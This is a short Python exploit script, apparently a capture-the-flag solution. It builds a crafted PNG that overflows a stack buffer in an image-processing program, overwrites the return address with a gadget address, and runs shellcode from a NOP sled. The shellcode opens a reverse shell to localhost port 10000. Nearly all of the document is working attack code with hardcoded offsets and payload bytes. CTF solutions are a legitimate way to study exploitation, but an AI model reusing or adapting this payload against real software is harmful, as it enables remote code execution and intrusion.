from PIL import Image
from pwn import *

"""
Solution idea: Use a pixel size of 11 to trigger the stack overflow with
favourable block boundaries to overwrite 8 bytes of the return address. Return
into the convenient gift gadget to execute shellcode from the stack where we
place a jump to jump into the input buffer which we have much more control over
as it is not restricted to pixel_size blocks of 4 bytes at a time like the
output buffer is.
"""

context.update(arch="amd64", os="linux")

filename = "hax.png"
data = list(cyclic(256 * 256 * 4))

sc =  shellcraft.connect(b"localhost", 10000)
sc += shellcraft.dupsh()
payload = asm(sc)

data[260000:260000+1000] = b'\x90'*1000
data[261000:261000+len(payload)] = payload

data[258176:258176+4] = [0x00, 0x00, 0x00, 0x00]
data[258088:258088+4] = [0x45, 0x1b, 0x40, 0x00]

i = 258264
data[i:i+4] = [0xeb, 0x28, 0xe9, 0x59]
i += 88
data[i:i+4] = [0x7f, 0xfe, 0xff, 0xfe]

rgba_data = []
for i in range(0, 256 * 256 * 4, 4):
    rgba_data.append(tuple(data[i:i+4]))

width, height = 256, 256

img = Image.new("RGBA", (width, height))

img.putdata(rgba_data)

img.save(filename, "PNG")
print(f"PNG saved as {filename}")
